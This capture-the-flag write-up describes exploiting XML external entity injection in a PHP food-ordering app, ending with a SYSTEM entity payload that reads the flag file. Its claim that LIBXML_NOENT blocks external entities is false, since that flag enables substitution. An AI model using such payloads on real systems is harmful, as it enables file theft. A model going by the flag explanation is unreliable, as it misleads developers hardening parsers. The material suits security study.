# WAFFiles 

In this challenge we are given an ip address and the web directory of the webapp. The application is utilizing **nginx**, **php-fpm**, which is a process manager for php, and **supervisorD**. Supervisord is a process control system for unix. It's designed to help manage and control processes on a sytem, particularly long-running or those that require continous monitoring.


The application is running php in the back end.


## index.php

In this file an instance of the Router class defined and used to handle GET / and POST /api/order requests for the Application. 

## Router.php

In this file the Router class is defined.

    Router {

* new($method, $route, $controller)
    * this method takes a HTTP method, URL path, and controller value and uses the values to define a route.
    * In its first use with the / route it is using an anonymous php function that is defining a route for the router instance. In this case its using routers view method to define the route as 'menu' or menu.php.
    * In the the other use of the new method its using POST as the HTTP method, the route is /api/order, and the controller is **OrderController@order** (controllerclass@method), which is a controller class and method within it. When this is called the **order method** will be invoked and the **OrderController** class will perform some logic, such as processing the new order. Inside this class is where input is handled and we can see that it accepts xml as an alternative to JSON, so that means **XXE**
           
* match()

* _match_route($route)

* getRouteParameters($route)

* abort($code)

* view($view, $data = [])
    }

## OrderController.php

In this file the order method is defined. 

```php

<?php
class OrderController
{
    public function order($router)
    {
        $body = file_get_contents('php://input');
        if ($_SERVER['HTTP_CONTENT_TYPE'] === 'application/json')
        {
            $order = json_decode($body);
            if (!$order->food)
                return json_encode([
                    'status' => 'danger',
                    'message' => 'You need to select a food option first'
                ]);
            return json_encode([
                'status' => 'success',
                'message' => "Your {$order->food} order has been submitted successfully."
            ]);
        }
        else if ($_SERVER['HTTP_CONTENT_TYPE'] === 'application/xml')
        {
            $order = simplexml_load_string($body, 'SimpleXMLElement', LIBXML_NOENT);
            if (!$order->food) return 'You need to select a food option first';
            return "Your {$order->food} order has been submitted successfully.";
        }
        else
        {
            return $router->abort(400);
```

We see that the logic accepts both json and xml format for the input of the order. Being familiar with the OWASP top 10, this stuck out to me, because of xxe. Inside of the second if branch the input $body is placed directly into the parser simplexml_load_string(). It is passed witht the param LIBXML_NOENT as well for some minor xxe prevention. But this input is not validated or sanitized beforehand. 
    * LIBXML_NOENT - I thought that this would prevent the injection from succeeding, however this flag only prevents external resources like DTD's and external entities referenced in the xml document. **BUT** it does not prevent entities being referenced that are **declared WITHIN** the input xml document.


# XXE

I have exploited xxe several times at this point, so I won't go into the details of how it works. I will just provide the payloads used.

**Original input**

```json
{
    "table_num":"1"
    "food":"WAFfles"
}
```
**Substituted xml input**

```xml
<data>
    <table_num>
        1
    </table_num>
    <food>
        WAFfles
    </food>
</data>
```

Now since we already have a response from the JSON formatted request we know that the "food" value is the one being reflected, so we attempt to reference an external entity decalred **WITHIN** the xml.

```xml
<!DOCTYPE foo [<!ENTITY test "helloworld">]>
<data>
    <table_num>
        1
    </table_num>
    <food>
        &test;
    </food>
</data>
```

And vuala we are returned with "Your helloworld order has been placed successfully."

Now we attempt to reference a file and since we are given the web file directory we know the name and location of the flag.
```xml
<!DOCTYPE foo [<!ENTITY test SYSTEM "file://.../flag">]>
```

And we were reflected the value of the flag.

**iMPORTANT NOTE: When declaring the path using SYSTEM with file:// or http:// the path begins after the double //. I made the mistake in not including these slashes in my first attempts with the file: protocol and it failed.**
        
